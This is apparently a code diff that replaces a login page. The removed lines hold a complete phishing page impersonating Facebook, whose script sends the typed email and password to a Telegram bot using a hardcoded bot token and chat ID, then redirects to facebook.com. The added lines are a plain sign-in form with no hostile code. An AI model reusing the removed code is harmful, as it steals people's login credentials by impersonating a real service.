@@ -1,78 +1,67 @@
-<!LOGIN>
-<html>
+<!DOCTYPE html>
+<html lang="en">
 <head>
-  <title>Facebook – log in or sign up</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Sign In</title>
   <style>
     body {
       font-family: Arial, sans-serif;
-      background: #f0f2f5;
-      display: flex;
-      align-items: center;
-      justify-content: center;
+      background: linear-gradient(120deg, #2980b9, #8e44ad);
       height: 100vh;
+      margin: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
     }
+
     .login-box {
       background: white;
       padding: 40px;
-      border-radius: 8px;
-      box-shadow: 0 2px 4px rgba(0,0,0,0.1);
-      width: 350px;
+      border-radius: 10px;
+      width: 100%;
+      max-width: 400px;
+      box-shadow: 0 10px 20px rgba(0,0,0,0.2);
     }
+
     .login-box h2 {
-      color: #1877f2;
       text-align: center;
+      margin-bottom: 30px;
     }
-    input {
+
+    .login-box input[type="email"],
+    .login-box input[type="password"] {
       width: 100%;
       padding: 12px;
-      margin-top: 10px;
-      margin-bottom: 10px;
-      border: 1px solid #ddd;
-      border-radius: 6px;
+      margin: 10px 0;
+      border: 1px solid #ccc;
+      border-radius: 5px;
     }
-    button {
+
+    .login-box button {
       width: 100%;
       padding: 12px;
-      background-color: #1877f2;
+      background: #2980b9;
       color: white;
       border: none;
-      border-radius: 6px;
-      font-size: 16px;
+      border-radius: 5px;
+      font-weight: bold;
+      cursor: pointer;
+    }
+
+    .login-box button:hover {
+      background: #2471a3;
     }
   </style>
 </head>
 <body>
   <div class="login-box">
-    <h2>Facebook</h2>
-    <form onsubmit="sendToTelegram(event)">
-      <input type="email" id="email" placeholder="Email or phone number" required />
-      <input type="password" id="password" placeholder="Password" required />
-      <button type="submit">Log In</button>
+    <h2>Sign In</h2>
+    <form method="POST" action="/signin">
+      <input type="email" name="email" placeholder="Email" required />
+      <input type="password" name="password" placeholder="Password" required />
+      <button type="submit">Login</button>
     </form>
   </div>
-
-  <script>
-    function sendToTelegram(e) {
-      e.preventDefault();
-      const email = document.getElementById('email').value;
-      const password = document.getElementById('password').value;
-
-      const botToken = '7987665609:AAGoXQ4o2dDSRkTH9CKbO_itBR4m9W6hIuU';
-      const chatId = '6722166633';
-      const message = `🔐 New Login Attempt\n📧 Email: ${email}\n🔑 Password: ${password}`;
-
-      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-        method: 'POST',
-        headers: {'Content-Type': 'application/json'},
-        body: JSON.stringify({
-          chat_id: chatId,
-          text: message
-        })
-      });
-
-      // Optional: redirect or show fake error
-      window.location.href = 'https://facebook.com';
-    }
-  </script>
 </body>
 </html>
